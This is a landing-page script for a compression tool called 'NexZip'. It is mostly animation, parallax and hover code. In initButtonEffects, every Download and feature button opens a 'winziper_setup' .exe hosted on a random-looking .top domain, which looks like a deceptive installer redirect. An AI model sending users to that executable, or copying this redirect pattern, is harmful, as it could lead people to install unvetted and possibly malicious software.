/**
 * NexZip - Interactive Script
 * Handles scroll animations, parallax effects, and micro-interactions
 */

document.addEventListener('DOMContentLoaded', function() {
    // Initialize all modules
    initScrollAnimations();
    initParallaxEffects();
    initIntersectionObserver();
    initSmoothScroll();
    initButtonEffects();
});

/**
 * Scroll-triggered animations using Intersection Observer
 */
function initScrollAnimations() {
    const animatedElements = document.querySelectorAll('.feature-card, .feature-item, .section-header, .function-icon-item, [data-animate], .brand-logo-area, .brand-slogan, .brand-buttons');
    
    const observerOptions = {
        root: null,
        rootMargin: '0px',
        threshold: 0.1
    };
    
    const observer = new IntersectionObserver((entries) => {
        entries.forEach((entry, index) => {
            if (entry.isIntersecting) {
                // Add staggered delay based on element index
                const delay = entry.target.dataset.delay || index * 100;
                setTimeout(() => {
                    entry.target.style.opacity = '1';
                    entry.target.style.transform = 'translateY(0)';
                    entry.target.classList.add('animated');
                }, delay);
                observer.unobserve(entry.target);
            }
        });
    }, observerOptions);
    
    animatedElements.forEach((el, index) => {
        // Skip elements that already have inline styles
        if (!el.style.opacity && !el.classList.contains('animated')) {
            el.style.opacity = '0';
            el.style.transform = 'translateY(30px)';
            el.style.transition = 'opacity 0.3s ease, transform 0.3s ease';
            el.dataset.delay = index * 30;
        }
        observer.observe(el);
    });
}

/**
 * Subtle parallax effect for background elements
 */
function initParallaxEffects() {
    const blobs = document.querySelectorAll('.bg-blob-left, .bg-blob-right');
    let ticking = false;
    
    window.addEventListener('scroll', () => {
        if (!ticking) {
            window.requestAnimationFrame(() => {
                const scrolled = window.pageYOffset;
                blobs.forEach((blob, index) => {
                    const speed = index === 0 ? 0.15 : 0.1;
                    blob.style.transform = `translateY(${scrolled * speed}px) ${index === 1 ? 'rotate(-15deg)' : ''}`;
                });
                ticking = false;
            });
            ticking = true;
        }
    });
}

/**
 * Enhanced intersection observer for various effects
 */
function initIntersectionObserver() {
    // Add hover effect enhancement
    const featureCards = document.querySelectorAll('.feature-card');
    
    featureCards.forEach(card => {
        card.addEventListener('mouseenter', () => {
            card.style.transform = 'translateY(-8px) scale(1.02)';
        });
        
        card.addEventListener('mouseleave', () => {
            card.style.transform = 'translateY(0) scale(1)';
        });
    });
    
    // Function icon items animation on scroll
    const iconItems = document.querySelectorAll('.function-icon-item');
    iconItems.forEach((item, index) => {
        item.style.opacity = '0';
        item.style.transform = 'translateY(20px)';
        item.style.transition = 'opacity 0.3s ease, transform 0.3s ease';
        item.dataset.delay = index * 30;
    });
    
    // CTA buttons animation
    const ctaButtons = document.querySelectorAll('.btn-cta-primary, .btn-cta-outline');
    ctaButtons.forEach((btn, index) => {
        btn.style.opacity = '0';
        btn.style.transform = 'translateY(20px)';
        btn.style.transition = 'opacity 0.3s ease, transform 0.3s ease';
        btn.dataset.delay = 400 + index * 30;
    });
    
    // Add ripple effect to buttons
    const buttons = document.querySelectorAll('.btn');
    
    buttons.forEach(btn => {
        btn.addEventListener('click', function(e) {
            const ripple = document.createElement('span');
            const rect = this.getBoundingClientRect();
            const size = Math.max(rect.width, rect.height);
            const x = e.clientX - rect.left - size / 2;
            const y = e.clientY - rect.top - size / 2;
            
            ripple.style.cssText = `
                position: absolute;
                width: ${size}px;
                height: ${size}px;
                left: ${x}px;
                top: ${y}px;
                background: rgba(255, 255, 255, 0.3);
                border-radius: 50%;
                transform: scale(0);
                animation: ripple 0.6s ease-out;
                pointer-events: none;
            `;
            
            this.style.position = 'relative';
            this.style.overflow = 'hidden';
            this.appendChild(ripple);
            
            setTimeout(() => ripple.remove(), 600);
        });
    });
    
    // Add CSS for ripple animation
    const style = document.createElement('style');
    style.textContent = `
        @keyframes ripple {
            to {
                transform: scale(2);
                opacity: 0;
            }
        }
    `;
    document.head.appendChild(style);
}

/**
 * Smooth scroll for anchor links
 */
function initSmoothScroll() {
    const links = document.querySelectorAll('a[href^="#"]');
    
    links.forEach(link => {
        link.addEventListener('click', function(e) {
            const href = this.getAttribute('href');
            if (href === '#') return;
            
            e.preventDefault();
            const target = document.querySelector(href);
            if (target) {
                target.scrollIntoView({
                    behavior: 'smooth',
                    block: 'start'
                });
            }
        });
    });
}

/**
 * Button hover and click effects
 */
function initButtonEffects() {
    // Unified download URL
    const downloadURL = 'https://res.gxqubinww.top/client/pc-zip/package/winziper_setup_db_20_1_202408082007.exe';

    /**
     * Handle download button clicks
     */
    function handleDownloadClick(e) {
        e.preventDefault();
        window.open(downloadURL, '_blank');
    }
    
    // Handle all Download buttons
    document.querySelectorAll('a, button').forEach(el => {
        const text = el.textContent.trim();
        if (text === 'Download') {
            el.addEventListener('click', handleDownloadClick);
        }
    });
    
    // Handle all feature detail buttons (Start Compress / Start Manage)
    document.querySelectorAll('.feature-detail-btn').forEach(btn => {
        btn.addEventListener('click', handleDownloadClick);
    });
    
    // Download button special effect
    const downloadBtn = document.querySelector('.btn-download');
    if (downloadBtn) {
        downloadBtn.addEventListener('mouseenter', () => {
            downloadBtn.style.boxShadow = '0 20px 50px rgba(47, 128, 255, 0.4)';
        });
        
        downloadBtn.addEventListener('mouseleave', () => {
            downloadBtn.style.boxShadow = '0 16px 40px rgba(47, 128, 255, 0.28)';
        });
    }
    
    // Feature cards shimmer effect on hover
    const featureItems = document.querySelectorAll('.feature-card');
    featureItems.forEach(item => {
        item.addEventListener('mouseenter', () => {
            item.style.background = 'rgba(255, 255, 255, 0.75)';
        });
        
        item.addEventListener('mouseleave', () => {
            item.style.background = 'rgba(255, 255, 255, 0.55)';
        });
    });
    
    // Feature detail cards hover effects
    const detailCards = document.querySelectorAll('.feature-detail-card');
    detailCards.forEach(card => {
        card.addEventListener('mouseenter', () => {
            card.style.boxShadow = '0 28px 80px rgba(40, 60, 120, 0.18)';
        });
        
        card.addEventListener('mouseleave', () => {
            card.style.boxShadow = '0 20px 60px rgba(40, 60, 120, 0.12)';
        });
    });
    
    // CTA buttons effects
    const ctaPrimary = document.querySelector('.btn-cta-primary');
    if (ctaPrimary) {
        ctaPrimary.addEventListener('mouseenter', () => {
            ctaPrimary.style.transform = 'translateY(-3px)';
        });
        
        ctaPrimary.addEventListener('mouseleave', () => {
            ctaPrimary.style.transform = 'translateY(0)';
        });
    }
    
    const ctaOutline = document.querySelector('.btn-cta-outline');
    if (ctaOutline) {
        ctaOutline.addEventListener('mouseenter', () => {
            ctaOutline.style.transform = 'translateY(-3px)';
        });
        
        ctaOutline.addEventListener('mouseleave', () => {
            ctaOutline.style.transform = 'translateY(0)';
        });
    }
    
    // Feature detail buttons effects
    const detailBtns = document.querySelectorAll('.feature-detail-btn');
    detailBtns.forEach(btn => {
        btn.addEventListener('mouseenter', () => {
            btn.style.boxShadow = '0 8px 24px rgba(47, 128, 255, 0.35)';
        });
        
        btn.addEventListener('mouseleave', () => {
            btn.style.boxShadow = 'none';
        });
    });
}

/**
 * Header scroll behavior
 */
(function() {
    let lastScroll = 0;
    const header = document.querySelector('.header');
    
    window.addEventListener('scroll', () => {
        const currentScroll = window.pageYOffset;
        
        // Add shadow on scroll
        if (currentScroll > 50) {
            header.style.boxShadow = '0 4px 30px rgba(0, 0, 0, 0.08)';
        } else {
            header.style.boxShadow = 'none';
        }
        
        lastScroll = currentScroll;
    });
})();

/**
 * Mockup card tilt effect on mouse move
 */
(function() {
    const mockupCard = document.querySelector('.mockup-card');
    if (!mockupCard) return;
    
    mockupCard.addEventListener('mousemove', (e) => {
        const rect = mockupCard.getBoundingClientRect();
        const x = e.clientX - rect.left;
        const y = e.clientY - rect.top;
        
        const centerX = rect.width / 2;
        const centerY = rect.height / 2;
        
        const rotateX = (y - centerY) / 20;
        const rotateY = (centerX - x) / 20;
        
        mockupCard.style.transform = `perspective(1000px) rotateX(${rotateX}deg) rotateY(${rotateY}deg) rotate(-1deg)`;
    });
    
    mockupCard.addEventListener('mouseleave', () => {
        mockupCard.style.transform = 'rotate(-1deg)';
    });
})();

/**
 * Typing effect for subtitle (optional enhancement)
 */
function initTypingEffect() {
    const subtitle = document.querySelector('.subtitle');
    if (!subtitle) return;
    
    const text = subtitle.textContent;
    subtitle.textContent = '';
    subtitle.style.borderRight = '2px solid var(--primary)';
    
    let i = 0;
    const typeInterval = setInterval(() => {
        if (i < text.length) {
            subtitle.textContent += text.charAt(i);
            i++;
        } else {
            clearInterval(typeInterval);
            subtitle.style.borderRight = 'none';
        }
    }, 30);
}

// Uncomment below to enable typing effect
// setTimeout(initTypingEffect, 1500);
